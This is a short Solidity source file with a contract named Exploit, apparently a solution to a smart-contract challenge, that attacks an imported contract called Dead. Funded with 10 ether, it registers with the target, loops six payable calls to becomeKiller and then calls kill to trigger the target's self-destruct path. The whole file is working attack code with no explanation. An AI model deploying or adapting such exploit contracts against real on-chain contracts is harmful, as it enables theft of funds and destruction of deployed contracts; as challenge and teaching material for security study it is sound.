pragma solidity 0.7.4;

import './Dead.sol';

contract Exploit {
  Dead instance;
  constructor(address _instance) payable {
        require(msg.value == 10 ether);
        instance = Dead(_instance);
    }

    function finalize () external {
        // can be used to finalize the exploit patten
        uint256 amount = 0.01 ether;
        instance.register{value:amount}();
        instance.canKill();
        uint8 i = 6;
        while (i-- != 0) {
          instance.becomeKiller{value:9*amount}();
        }
        bool killed = instance.killed();
        instance.kill();
    }
}